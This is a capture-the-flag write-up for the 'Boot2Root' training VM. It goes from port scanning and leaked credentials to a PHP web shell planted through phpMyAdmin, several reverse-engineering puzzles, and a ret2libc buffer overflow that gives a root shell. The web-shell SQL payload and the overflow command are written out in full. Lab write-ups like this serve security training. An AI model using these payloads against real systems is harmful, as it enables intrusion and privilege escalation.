 ```
 ____              _   ___  _____             _   
 |  _ \            | | |__ \|  __ \           | |  
 | |_) | ___   ___ | |_   ) | |__) |___   ___ | |_ 
 |  _ < / _ \ / _ \| __| / /|  _  // _ \ / _ \| __|
 | |_) | (_) | (_) | |_ / /_| | \ \ (_) | (_) | |_ 
 |____/ \___/ \___/ \__|____|_|  \_\___/ \___/ \__|
 ```
 
After the setup we are presented with 

![BorntoSec](https://github.com/Ziltoid42/Boot2Root_42/blob/master/bonus/images/setup.png)



-----------------------------------------------------------------------------------

## Information gathering

We need to understand what we can gain access to and where it is located.

* First step is to find the ip of the VM by using ifconfig 
ifconfig should display a range of IP for the vm between 1 and 255

* Second step is to use ***nmap*** in order to uncover wich ports are open by executing: ```nmap 192.168.99.1-255```

This gives back the precise IP and the open ports:
```
Nmap scan report for 192.168.99.100
Host is up (0.00048s latency).
Not shown: 994 closed ports
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
80/tcp  open  http
143/tcp open  imap
443/tcp open  https
993/tcp open  imaps
```
From this we know that the exact ip ends with .100 and that port
80 should be open and accessible Through a web browser

We are presented to a basic webpage:
![website](https://github.com/Ziltoid42/Boot2Root_42/blob/master/bonus/images/website.png)


* Now that we know the IP, we're going to use DIRB to gather information about the file structure.
[DIRB](https://sourceforge.net/projects/dirb/files/)
is a tool that uses dictionaries of common file systems naming paterns in order uncover their presence.


```
./dirb https://192.168.99.100/ wordlists/common.txt -w
```

We uncover :

- https://192.168.99.100/forum/  with subfolders:
  - js
  - lang
  - modules
  - templates_c
  - themes
  - update
- https://192.168.99.100/phpmyadmin/
- https://192.168.99.100/webmail/

-------------------------------------------------------------------------------------------

Lets start by accessing the forum. There's a link that displays the users and what they posted, lmezard posted "Probleme login ?"  

![forum](https://github.com/Ziltoid42/Boot2Root_42/blob/master/bonus/images/forum1.png)

It links to a log output of what seems to be admin logins 

When looking for the lmezard "Failed password for invalid user", one line seems very out of place: ```Failed password for invalid user !q\]Ej?*5K5cy*AJ```

Could this be lmezard's password? :smirk:

With this password we can then login to the forum with lmezard's credentials and discover that her email address is laurie@borntosec.net

-------------------------------------------------------------------------------------------

Let's try to log to the webmail with this email and the same password:

![webmail](https://github.com/Ziltoid42/Boot2Root_42/blob/master/bonus/images/webmail.png)

Nice...
Let's check the mail DB ACCESS:

-->
Hey Laurie,

You cant connect to the databases now. Use root/Fg-'kKXBj87E:aJ$

Best regards.
-->
***Bouyaaa !!!***


--------------------------------------------------------------------------------------------

Now lets login to phpmyadmin

login: root
password: Fg-'kKXBj87E:aJ$


Following [This tutorial on PHPmyadmin exploitation](http://www.informit.com/articles/article.aspx?p=1407358&seqNum=2)

We're going to inject a php file that allows us to run shell commands within the browser.
By trying the differents subfolders of the forum we finally uncover that phpmydamin has writing rights to templates_c:

```SELECT "<? System($_REQUEST['cmd']); ?>" into outfile "/var/www/forum/templates_c/cmd.php";```

"/var/www/html/" because this is where websites are normally stored on a server.


![phpmyadmin](https://github.com/Ziltoid42/Boot2Root_42/blob/master/bonus/images/webmail.png)

---------------------------------------------------------------------------------------------

* Funny thing is we can now navigate the server through the web browser
```https://192.168.99.100/forum/templates_c/cmd.php?cmd=ls%20../../../../home/```

From there we uncover the presence of an intersting folder called ***LOOKATME*** inside the home folder that contains a file called password

```https://192.168.99.100/forum/templates_c/cmd.php?cmd=cat%20../../../../home/LOOKATME/password```

this gives us the pair: ```lmezard:G!@M6f4Eatau{sF"```

----------------------------------------------------------------------------------------------

Let's try that in the ftp access [ftp!](ftp://192.168.99.100/)

It works !

There's a file called "fun" and README file that says : ```Complete this little challenge and use the result as password for user 'laurie' to login in ssh```

-----------------------------------------------------------------------------------------------

## Puzzles to root access

fun turns out to be an archive, which when uncompressed shows multiples .pcap files (packets captured by a wireshark type sniffer). using ```grep return *```  we can get 12 files each containing a character. By ordering the files in ascending order based on the comments values we get: "Iheartpwnage" 
A hint in the fun file also tells us to sha256 the result, which gives: "330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4"  

We can finally access to laurie's account to the server:

```laurie@192.168.99.100```
"330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4"
![ssh](https://github.com/Ziltoid42/Boot2Root_42/blob/master/bonus/images/ssh.png)

------------------------------------------------------------------------------------------------

There we find a README hinting that solving the bomb wil grant us access to thor's shh access
When we disassemble the bomb we uncover 6 functions called phase_X (X being a number between 1 and 6) 

1. Bomb PHASE 1 : 'Public speaking is very easy.'
	We find the string 'Public speaking is very easy.' at the address 0x080497c0 ```x/s 0x080497c0``` Just after that we see the function 'strings_not_equal' is called. We deduct our input will be compared to the precedent string.

2. Bomb PHASE 2 : '1 2 6 24 120 720'
	We find the function 'read_six_numbers' and the string '%d %d %d %d %d %d' at the address 0x08049b1b. We know from the hints the first number is 1, the others are multiples of their position in the sequence ```(1*1, 2*1, 3*2, 4*6, 5*24, 6*120)```

3. Bomb PHASE 3: ''1 b 214'
	We find the string "%d %c %d" at the address 0x80497de that indicates the expected input, hints gives us the 'b' CHAR, reading the assembly code gives us the rest. ***Warning*** several solutions possible but only this one gives us the right password at the end 

4. Bomb PHASE 4: "9"
	We find the string "%d" at the address 0x8049808 that indicates the expected input. We see the expected result is '55' at the address 0x8048d1d, we get the result by inversing the assembly code

5. Bomb PHASE 5: "opekmq"
	We find the string "giants" at the address 0x804980b that indicates the expected final result. We also uncover the tab "isrveawhobpnutfg" at the address 0x8048d7b. We understand the program is going to apply operations on each char of our input and compare it to the tab. After several tests we finally find the result. ***Warning*** several solutions possible but only this one gives us the right password at the end 

6. Bomb PHASE 6: "4 2 6 3 1 5"
	We find the function 'read_six_numbers' hinting at the expected input, and the hints gives us '4'. We understand the program is a series of loops with several conditions. We need to reverse the assembly code and test different inputs until we find the solution.

Finally the end result is the concatenation of all the results: "Publicspeakingisveryeasy.126241207201b2149opekmq426315" However and error forces us to inverse the 3 and 1 characters at the end of the string (thanks to that one guys on the forum)

***This finally gets us access to thor's ssh !***


------------------------------------------------------------------------------------------------

Inside there is a file called turtle and a README telling us solving the riddle will grant us zaz's ssh access

The turtle file contains instruction structured like this:

```
Tourne droite de 1 degrees
Avance 1 spaces
Tourne droite de 1 degrees
Avance 50 spaces

Avance 210 spaces
Recule 210 spaces
Tourne droite de 90 degrees
Avance 120 spaces

Tourne droite de 10 degrees
Avance 200 spaces
Tourne droite de 150 degrees
Avance 200 spaces
Recule 100 spaces
Tourne droite de 120 degrees
Avance 50 spaces

Tourne gauche de 90 degrees
Avance 50 spaces
```

[Turtle](https://docs.python.org/2/library/turtle.html) turns out to be a python module used to draw pictures

By using our provided script, we parse and draw what turns to write "SLASH":

![turtle](https://github.com/Ziltoid42/Boot2Root_42/blob/master/bonus/images/turtle.png)

We then md5 SLASH in order to get zaz's password: "646da671ca01bb5d84dbb5fb2238dc8e"

------------------------------------------------------------------------------------------------------

## Buffer overflow

After connecting to zaz by ssh, we find a binary file called ***exploit_me***

Exploit_me has a particularity though, it has ***root rights***, meaning it has the right to execute root binaries limited to his reach :smirk: 

Lets check its content wih gdb and disasemble it:

![disas](https://github.com/Ziltoid42/Boot2Root_42/blob/master/bonus/images/disas.png)

And sure enough it uses the strcpy function, which is a well known security risk, as it doesn't compare the input size to its destination buffer. This allows to to atempt an attack by ret2libc


- We place 3 breakpoints (```b * <address>```) in the program:
  - One at the begining of the execution
  - One at the call to strcpy
  - One after the return value of strcpy

- We then run the program a first time with a random input ```OSEF``` in order to get the buffer address
- We get adsress of the system function with ```p system```                                          
------------------------------------------------
![system](https://github.com/Ziltoid42/Boot2Root_42/blob/master/bonus/images/system.png)
- Then we fetch the address of the char str "/bin/sh" with the command: ```find &system,+9999999, "/bin/sh"```
- Finally we get the buffer size by substracting the address of $eip with the buffer address and find ***140***: 
------------------------------------------------
![substract](https://github.com/Ziltoid42/Boot2Root_42/blob/master/bonus/images/substract.png)

- This allows us to launch the ret2lib attack with this command: 

```./exploit_me $(python -c "print('A'*140 + '\xb7\xe6\xb0\x60'[::-1] + 'OSEF' + '\xb7\xf8\xcc\x58'[::-1])")``` 
Which gives us a shell with root access !

![congrats_overflow](https://github.com/Ziltoid42/Boot2Root_42/blob/master/bonus/images/congrats_overflow.png)



